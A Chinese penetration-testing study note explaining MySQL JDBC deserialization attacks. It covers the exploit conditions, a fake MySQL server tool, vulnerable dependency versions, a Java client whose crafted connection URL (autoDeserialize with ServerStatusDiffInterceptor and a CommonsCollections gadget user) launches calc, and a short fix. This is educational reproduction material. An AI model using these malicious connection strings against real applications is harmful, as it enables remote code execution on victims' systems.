#  JDBC反序列化漏洞   
原创 joyboy  fly的渗透学习笔记   2024-05-18 17:58  
  
**免责声明：**  
  
      本次文章仅限个人学习使用，如有非法用途均与作者无关，且行且珍惜；由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除整改并向您致以歉意。谢谢！  
  
**JDBC简介：**  
  
JDBC 就是使用Java语言操作关系型数据库的一套API 全称：( Java DataBase Connectivity ) Java 数据库连接。  
JDBC的引入实现了java程序对数据库的便捷访问，通过使用JDBC，可以将sql语句传给任何一种数据库，不必单独写程序访问不同的数据库。  
  
**漏洞原理：**  
  
jdbc  
连接  
数据库的过程中，开启连接地址中的一些连接参数就有可能造成反序列化漏洞。  
  
利用条件：  
  
l  
攻击者可以控制  
JDBC  
的连接设置项，比如：mysql的  
autoDeserialize=true  
  
l  
可以控制数据库服务器（搭建的恶意的数据库服务器）  
  
l存在  
可以打的依赖  
  
**漏洞复现：**  
  
搭建恶意的mysql服务端：  
  
使用大佬的图形化工具：  
```
https://github.com/4ra1n/mysql-fake-server/
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6rg0u9Niad9ibic6AWmOicBiaFelPF2sUbhetE9xGnzQBEDgvIK0zDLB9XaegLxATic7iaKfXiaUUiaBb3jTbQ/640?wx_fmt=png&from=appmsg "")  
  
  
可以选择利用链、漏洞类型、触发点、数据库版本、自定义命令、自动生成数据库连接URL，基本全部自动化，非常贴心了![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/Expression/Expression_80@2x.png "")  
  
  
然后使用idea模拟客户端连接服务器：  
  
新建maven项目导入下面的依赖：  
```
  <dependencies>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.19</version>
        </dependency>

        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
```  
  
模拟客户端连接数据库demo  
```
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class jdbc_test {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        String driver = "com.mysql.cj.jdbc.Driver";
//数据库连接URL以及相关配置
        String url = "jdbc:mysql://192.168.1.105:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CC31_calc";
//加载驱动类
        Class.forName(driver);

//通过 Drivermanager 类获取数据库连接的实例
        Connection connection = DriverManager.getConnection(url);
    }
}

```  
  
运行即可执行calc命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6rg0u9Niad9ibic6AWmOicBiaFelexILt0vrCJGmj2aTaviaU4AlyQyqeaHAMB0roCqeBE2Vn0Kq4ibtEAXw/640?wx_fmt=png&from=appmsg "")  
  
**漏洞修复：**  
```
禁用autoDeserialize
Properties properties=new Properties();
properties.setProperty("autoDeserialize","false");
```  
  
  
  
